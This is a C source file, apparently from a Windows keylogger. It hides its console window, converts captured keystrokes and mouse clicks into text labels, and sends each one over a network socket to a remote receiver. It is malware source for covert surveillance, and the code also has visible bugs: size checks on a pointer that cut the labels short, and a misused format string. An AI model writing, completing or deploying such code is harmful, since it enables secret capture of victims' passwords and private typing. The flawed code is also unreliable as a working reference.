#include "funcs.h"

void stealth()
{
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key, char* buf, int doDebug, SOCKET sock)
{
    if(key == 2) return 0;

    switch(key)
    {
        case 8: snprintf(buf, sizeof(buf),"[BACKSPACE]"); break;
        case VK_RETURN: snprintf(buf, sizeof(buf),"[RETURN]"); break;
        case VK_SPACE: snprintf(buf, sizeof(buf),"[SPACE]"); break;
        case VK_TAB: snprintf(buf, sizeof(buf),"[TAB]"); break;
        case VK_SHIFT: snprintf(buf, sizeof(buf),"[SHIFT]"); break;
        case VK_CONTROL: snprintf(buf, sizeof(buf),"[CONTROL]"); break;
        case VK_ESCAPE: snprintf(buf, sizeof(buf),"[ESCAPE]"); break;
        case VK_END: snprintf(buf, sizeof(buf),"[END]"); break;
        case VK_HOME: snprintf(buf, sizeof(buf),"[HOME]"); break;
        case VK_LEFT: snprintf(buf, sizeof(buf),"[LEFT]"); break;
        case VK_RIGHT: snprintf(buf, sizeof(buf),"[RIGHT]"); break;
        case VK_UP: snprintf(buf, sizeof(buf),"[UP]"); break;
        case VK_DOWN: snprintf(buf, sizeof(buf),"[DOWN]"); break;
        case VK_CANCEL: snprintf(buf, sizeof(buf),"[CANCEL]"); break;
        case VK_CAPITAL: snprintf(buf, sizeof(buf),"[CAPITAL]"); break;
        case VK_CLEAR: snprintf(buf, sizeof(buf),"[CLEAR]"); break;
        case VK_LBUTTON: snprintf(buf, sizeof(buf),"[LEFT-CLICK]"); break;
        case VK_RBUTTON: snprintf(buf, sizeof(buf),"[RIGHT-CLICK]"); break;
        case VK_BROWSER_SEARCH: snprintf(buf, sizeof(buf),"[BROWSER-SEARCH]"); break;
        case VK_BROWSER_BACK: snprintf(buf, sizeof(buf),"[BROWSER-BACK]"); break;
        case VK_BROWSER_REFRESH: snprintf(buf, sizeof(buf),"[BROWSER-REFRESH]"); break;
        case VK_BROWSER_STOP: snprintf(buf, sizeof(buf),"[BROWSER-STOP]"); break;
        default: snprintf(buf, sizeof(buf),"%s", &key); break;
    }

    if(send(sock, buf, sizeof(buf), 0) == SOCKET_ERROR)
    debug(doDebug, 0, "[-]Error in send().", WSAGetLastError());

    return 0;
}

void debug(int doDebug, int success, char* msg, int errorCode)
{
    if(!doDebug) return;
    if(success) printf("%s", msg);
    else if(errorCode != -1)
    {
        printf("%sCode: %d", msg, errorCode);
        exit(EXIT_FAILURE);
    }
    else //not printing the errocode
    {
        printf("%s", msg);
        exit(EXIT_FAILURE);
    }
}